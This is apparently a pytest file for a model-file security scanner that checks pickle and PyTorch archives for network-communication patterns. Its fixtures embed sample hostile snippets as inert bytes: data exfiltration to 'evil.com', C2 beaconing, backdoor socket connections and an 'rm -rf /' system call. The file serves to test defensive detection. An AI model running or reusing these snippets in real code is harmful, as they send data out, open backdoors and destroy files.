"""Integration tests for network communication detection with scanners."""

import pickle
import zipfile
from pathlib import Path

from modelaudit.scanners.base import CheckStatus, IssueSeverity
from modelaudit.scanners.pickle_scanner import PickleScanner
from modelaudit.scanners.pytorch_zip_scanner import PyTorchZipScanner


class TestNetworkCommIntegration:
    """Test network communication detection integration with scanners."""

    def test_pickle_scanner_integration(self, tmp_path):
        """Test network communication detection in pickle scanner."""
        # Create a pickle file with network patterns
        test_file = tmp_path / "model_with_network.pkl"

        data = {
            "model_weights": [1.0, 2.0, 3.0],
            "config": {
                "server_url": "http://malicious-c2.com/upload",
                "beacon_interval": 60,
            },
            "code": b"""
import socket
import requests

def exfiltrate(data):
    requests.post('http://evil.com/steal', json=data)
    socket.connect(('192.168.1.100', 4444))
""",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        # Scan the file
        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        assert result is not None

        # Check that network communication was detected
        network_checks = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        assert len(network_checks) > 0

        detection_checks = [c for c in network_checks if c.name == "Network Communication Detection"]
        assert detection_checks, "Expected explicit network detection checks"
        valid_network_codes = {f"S{code}" for code in range(301, 311)}
        assert all(c.rule_code in valid_network_codes for c in detection_checks), (
            "Network findings should map to S301-S310 and not encoding rule codes"
        )

        # Should detect multiple patterns
        messages = [c.message for c in network_checks]
        assert any("socket" in msg for msg in messages)
        assert any("requests" in msg or "http" in msg for msg in messages)

    def test_pickle_scanner_metadata_field_description_text_no_fp(self, tmp_path: Path) -> None:
        """Description prose mentioning network APIs should not fail network checks."""
        test_file = tmp_path / "model_with_network_docs.pkl"
        data = {
            "model_weights": [1.0, 2.0, 3.0],
            "description": "Model documentation includes import socket and requests.get examples.",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        result = PickleScanner().scan(str(test_file))

        network_checks = [check for check in result.checks if check.name == "Network Communication Detection"]
        assert network_checks, "Expected Network Communication Detection check to be emitted"
        assert all(check.status != CheckStatus.FAILED for check in network_checks)
        assert any(check.status == CheckStatus.PASSED for check in network_checks)

    def test_pytorch_zip_scanner_integration(self, tmp_path):
        """Test network communication detection in PyTorch ZIP scanner."""
        # Create a PyTorch ZIP file with network patterns
        test_file = tmp_path / "model_with_network.pt"

        with zipfile.ZipFile(test_file, "w") as zf:
            # Add model data
            model_data = {
                "state_dict": {"layer1.weight": [1.0, 2.0]},
                "network_config": "connect_to: evil.com:1337",
            }
            zf.writestr("data.pkl", pickle.dumps(model_data))

            # Add a Python file with network code
            network_code = b"""
import urllib.request
import socket

class NetworkExfiltrator:
    def __init__(self):
        self.c2_server = "http://command-control.net"
        self.backdoor_port = 31337

    def phone_home(self):
        urllib.request.urlopen(self.c2_server + "/beacon")

    def open_backdoor(self):
        s = socket.socket()
        s.connect(("0.0.0.0", self.backdoor_port))
"""
            zf.writestr("network_module.py", network_code)

        # Scan the file
        scanner = PyTorchZipScanner()
        result = scanner.scan(str(test_file))

        assert result is not None

        # Check that network communication was detected
        network_checks = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        assert len(network_checks) > 0

        # Should detect suspicious patterns
        all_messages = " ".join(c.message for c in network_checks)
        # Check for backdoor detection (the scanner detects port 1337 as a common backdoor)
        assert "backdoor" in all_messages.lower() or "1337" in all_messages

    def test_pytorch_zip_scanner_metadata_readme_member_no_network_fp(self, tmp_path: Path) -> None:
        """README-style archive members should not fail network checks for prose mentions."""
        test_file = tmp_path / "model_with_network_readme.pt"

        with zipfile.ZipFile(test_file, "w") as zf:
            zf.writestr("version", "3\n")
            zf.writestr("byteorder", "little")
            zf.writestr("data.pkl", pickle.dumps({"state_dict": {"layer1.weight": [1.0, 2.0]}}))
            zf.writestr(
                "metadata/README.md",
                b"This README says import socket and requests.get can be used in client examples.",
            )

        result = PyTorchZipScanner().scan(str(test_file))

        network_checks = [check for check in result.checks if check.name == "Network Communication Detection"]
        assert network_checks, "Expected Network Communication Detection check to be emitted"
        assert all(check.status != CheckStatus.FAILED for check in network_checks)
        assert any(check.status == CheckStatus.PASSED for check in network_checks)

    def test_network_detection_can_be_disabled(self, tmp_path):
        """Test that network detection can be disabled via config."""
        # Create a pickle file with network patterns
        test_file = tmp_path / "model.pkl"

        data = {
            "url": "http://malicious.com",
            "socket_code": b"socket.connect(('evil.com', 4444))",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        # Scan with network detection disabled
        scanner = PickleScanner(config={"check_network_comm": False})
        result = scanner.scan(str(test_file))

        # Should not have any network communication checks
        network_checks = [c for c in result.checks if "Network Communication" in c.name]

        assert len(network_checks) == 0

    def test_network_detection_severity_levels(self, tmp_path):
        """Test that different patterns have appropriate severity levels."""
        # Create a pickle with various severity patterns
        test_file = tmp_path / "severity_test.pkl"

        data = {
            # Critical: malware/backdoor patterns
            "malware_config": {"backdoor": True},
            # High: network libraries
            "imports": b"import socket",
            # Medium: regular URLs
            "url": "http://example.com",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        network_checks = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        # Should have network-related checks (severity depends on pattern type)
        severities = [c.severity.value for c in network_checks if c.severity is not None]
        # Network patterns are typically INFO severity (informational detection)
        # CRITICAL is reserved for actual code execution vectors
        assert len(severities) > 0, "Should detect network-related patterns"

    def test_combined_detections(self, tmp_path: Path) -> None:
        """Test that network detection works alongside other detections."""
        # Create a pickle with multiple security issues
        test_file = tmp_path / "multi_issue.pkl"

        data = {
            # Network communication
            "c2_server": "http://evil.com",
            "network_lib": b"import socket",
            # Dangerous imports (existing check)
            "dangerous": b"import os\nos.system('rm -rf /')",
            # JIT/Script code
            "jit_code": b"torch.ops.aten.system('echo pwned')",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        # Should detect network communication issues
        network_checks = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        assert len(network_checks) > 0

        # Should detect multiple network patterns. Source/stream URLs are redacted
        # out of finding messages (URL-redaction hardening) and bare inert URL
        # metadata is filtered, so the literal "evil.com" no longer appears; assert
        # the real signal instead: the network capability still fires at CRITICAL.
        assert any(c.severity == IssueSeverity.CRITICAL for c in network_checks)
        network_messages = [c.message for c in network_checks]
        assert any("socket" in msg for msg in network_messages)
        assert any("c2" in msg.lower() for msg in network_messages)

    def test_no_false_positives(self, tmp_path):
        """Test that clean models don't trigger false positives."""
        # Create a clean model file
        test_file = tmp_path / "clean_model.pkl"

        data = {
            "model_state": {
                "layer1.weight": [1.0, 2.0, 3.0, 4.0],
                "layer1.bias": [0.1, 0.2],
                "layer2.weight": [5.0, 6.0, 7.0, 8.0],
            },
            "optimizer_state": {
                "lr": 0.001,
                "momentum": 0.9,
                "weight_decay": 0.0001,
            },
            "training_config": {
                "batch_size": 32,
                "epochs": 100,
                "validation_split": 0.2,
            },
            "version": "1.0.0",
        }

        with open(test_file, "wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        # Should not have any failed network communication checks
        network_issues = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]

        assert len(network_issues) == 0

        # Should have a passing network check
        network_pass = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.PASSED
        ]

        assert len(network_pass) == 1
        assert "No network communication patterns detected" in network_pass[0].message

    def test_huggingface_homepage_url_stays_informational(self, tmp_path: Path) -> None:
        """Benign Hugging Face metadata URLs should not become security warnings."""
        test_file = tmp_path / "model_metadata.pkl"
        data = {"homepage": "https://huggingface.co/meta-llama/Llama-2-7b"}

        with test_file.open("wb") as f:
            pickle.dump(data, f)

        scanner = PickleScanner()
        result = scanner.scan(str(test_file))

        # A bare, passive URL stored as plain pickle metadata is inert data, not a
        # network capability, so it is filtered before network detection and produces
        # no failed finding. Any network finding that does surface must stay INFO, and
        # the benign metadata must never escalate to a warning/critical issue.
        network_failures = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.FAILED
        ]
        assert all(c.severity == IssueSeverity.INFO for c in network_failures)

        network_pass = [
            c for c in result.checks if "Network Communication" in c.name and c.status == CheckStatus.PASSED
        ]
        assert network_pass, "Expected the benign metadata URL to leave a passing network check"

        warning_or_critical_issues = [
            issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        ]
        assert warning_or_critical_issues == []
